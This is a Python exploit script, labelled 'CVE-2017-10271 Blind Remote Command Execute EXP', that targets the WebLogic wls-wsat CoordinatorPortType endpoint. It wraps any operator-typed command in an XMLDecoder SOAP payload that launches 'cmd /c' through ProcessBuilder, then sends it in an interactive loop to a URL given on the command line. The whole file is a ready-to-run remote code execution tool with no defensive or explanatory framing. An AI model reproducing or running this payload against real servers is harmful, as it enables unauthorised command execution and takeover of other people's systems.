from __future__ import print_function
from builtins import input
import requests
import sys
url_in = sys.argv[1]
payload_url = url_in + "/wls-wsat/CoordinatorPortType"
payload_header = {'content-type': 'text/xml'}
def payload_command (command_in):
    html_escape_table = {
        "&": "&amp;",
        '"': "&quot;",
        "'": "&apos;",
        ">": "&gt;",
        "<": "&lt;",
    }
    command_filtered = "<string>"+"".join(html_escape_table.get(c, c) for c in command_in)+"</string>"
    payload_1 = "<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\"> \n" \
                "   <soapenv:Header> " \
                "       <work:WorkContext xmlns:work=\"http://bea.com/2004/06/soap/workarea/\"> \n" \
                "           <java version=\"1.8.0_151\" class=\"java.beans.XMLDecoder\"> \n" \
                "               <void class=\"java.lang.ProcessBuilder\"> \n" \
                "                  <array class=\"java.lang.String\" length=\"3\">" \
                "                      <void index = \"0\">                       " \
                "                          <string>cmd</string>                 " \
                "                      </void>                                    " \
                "                      <void index = \"1\">                       " \
                "                          <string>/c</string>                  " \
                "                      </void>                                    " \
                "                      <void index = \"2\">                       " \
                + command_filtered + \
                "                      </void>                                    " \
                "                  </array>" \
                "                  <void method=\"start\"/>" \
                "                  </void>" \
                "            </java>" \
                "        </work:WorkContext>" \
                "   </soapenv:Header>" \
                "   <soapenv:Body/>" \
                "</soapenv:Envelope>"
    return payload_1
def do_post(command_in):
    result = requests.post(payload_url, payload_command(command_in ),headers = payload_header)
    if result.status_code == 500:
        print("Command Executed \n")
    else:
        print("Something Went Wrong \n")
print("***************************************************** \n" \
       "****************   Coded By 1337g  ****************** \n" \
       "*  CVE-2017-10271 Blind Remote Command Execute EXP  * \n" \
       "***************************************************** \n")
while 1:
    command_in = input("Eneter your command here: ")
    if command_in == "exit" : exit(0)
    do_post(command_in)